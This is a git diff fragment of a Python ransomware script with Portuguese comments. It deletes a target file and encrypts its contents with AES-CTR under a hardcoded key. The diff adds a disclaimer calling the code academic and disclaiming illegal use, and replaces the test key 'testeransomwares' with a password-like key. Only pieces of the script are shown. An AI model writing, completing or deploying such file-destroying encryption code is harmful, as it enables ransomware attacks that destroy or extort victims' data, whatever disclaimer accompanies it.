@@ -1,3 +1,5 @@
+## Não me responsabilizo por qualquer uso ilegal do código abaixo.
+## O código foi feito apenas para fins academicos
 import os
 import pyaes
 
@@ -10,8 +12,8 @@ file.close()
 ## remover o arquivo
 os.remove(file_name)
 
-## chave de criptografia
-key = b"testeransomwares"
+## chave de criptografia dos arquivos
+key = b"P@55D3cr1pty@231"
 aes = pyaes.AESModeOfOperationCTR(key)
 
 ## criptografar o arquivo
